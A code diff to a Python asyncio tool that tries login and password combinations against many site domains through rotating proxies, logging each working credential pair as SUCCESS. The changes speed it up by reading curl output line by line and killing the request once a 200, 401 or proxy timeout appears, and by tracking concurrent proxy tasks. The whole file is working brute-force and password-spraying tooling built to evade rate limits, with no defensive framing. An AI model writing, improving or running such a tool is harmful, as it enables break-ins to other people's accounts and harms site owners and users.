@@ -1,10 +1,10 @@
 import asyncio
 import logging
 import os
+import sys
 import uuid
 from collections import defaultdict
 from typing import List
-import sys
 
 import aiofiles
 
@@ -62,23 +62,68 @@ async def execute_curl(site_domain, user_domain, login, password, proxy):
     ]
 
     try:
-        proc = await asyncio.create_subprocess_exec(*curl_cmd, stdout=asyncio.subprocess.PIPE,
-                                                    stderr=asyncio.subprocess.PIPE)
-        stdout, stderr = await proc.communicate()
-        output = stdout.decode()
-        if "HTTP/1.1 200" in output or "HTTP/2 200" in output:
+        logger.info(f'Execute: {curl_cmd}')
+        proc = await asyncio.create_subprocess_exec(
+            *curl_cmd,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+
+        found_code = None
+
+        async def read_stdout():
+            nonlocal found_code
+            while True:
+                line = await proc.stdout.readline()
+                if not line:
+                    break
+                decoded = line.decode()
+                if "HTTP/1.1 200" in decoded or "HTTP/2 200" in decoded:
+                    found_code = 200
+                    break
+                elif "HTTP/1.1 401" in decoded or "HTTP/2 401" in decoded:
+                    found_code = 401
+                    break
+
+        async def read_stderr():
+            while True:
+                line = await proc.stderr.readline()
+                if not line:
+                    break
+                decoded = line.decode()
+                if "Operation timed out" in decoded or "Connection timed out" in decoded or "(97)" in decoded:
+                    nonlocal found_code
+                    found_code = "proxy_error"
+                    break
+
+        task_stdout = asyncio.create_task(read_stdout())
+        task_stderr = asyncio.create_task(read_stderr())
+
+        while found_code is None and proc.returncode is None:
+            await asyncio.sleep(0.05)
+            if found_code is not None:
+                proc.kill()
+                break
+            if proc.stdout.at_eof() and proc.stderr.at_eof():
+                break
+
+        await proc.wait()
+        await task_stdout
+        await task_stderr
+
+        if found_code == 200:
             logger.info(f"SUCCESS: {site_domain} {full_user}:{password}")
             return 200
-        elif "HTTP/1.1 401" in output or "HTTP/2 401" in output:
+        elif found_code == 401:
             logger.info(f"FAIL: {site_domain} {full_user}:{password} Unauthorized")
             return 401
-        elif "Operation timed out" in stderr.decode() or "Connection timed out" in stderr.decode() or "(97)" in stderr.decode():
+        elif found_code == "proxy_error":
             logger.warning(f"PROXY TIMEOUT: {site_domain} {full_user}:{password} {proxy}")
             return "proxy_error"
         else:
             logger.warning(f"UNKNOWN RESPONSE: {site_domain} {full_user}:{password} {proxy}, treating as 401")
-            logger.warning(f'RESPONSE: {stdout}{stderr}')
             return 401
+
     except Exception as e:
         logger.error(f"EXCEPTION: {site_domain} {full_user}:{password} {proxy} — {str(e)}")
         return 401
@@ -137,20 +182,22 @@ async def worker(domain_line, logins, passwords):
         async with proxy_lock:
             active_proxies.discard(proxy)
 
-    while len(tried) < total_combinations:
+    tasks = []
+    while len(tried) < total_combinations or any([not task.done() for task in tasks]):
         async with proxy_lock:
             proxy_list = await load_lines(PROXY_FILE)
 
         available_proxy = None
-        for proxy in proxy_list:
-            async with proxy_lock:
-                if proxy not in active_proxies:
-                    active_proxies.add(proxy)
-                    available_proxy = proxy
-                    break
+        if len(tried) < total_combinations:
+            for proxy in proxy_list:
+                async with proxy_lock:
+                    if proxy not in active_proxies:
+                        active_proxies.add(proxy)
+                        available_proxy = proxy
+                        break
 
         if available_proxy is not None:
-            loop.create_task(run_proxy_task(available_proxy))
+            tasks.append(loop.create_task(run_proxy_task(available_proxy)))
             continue
 
         await asyncio.sleep(0.5)
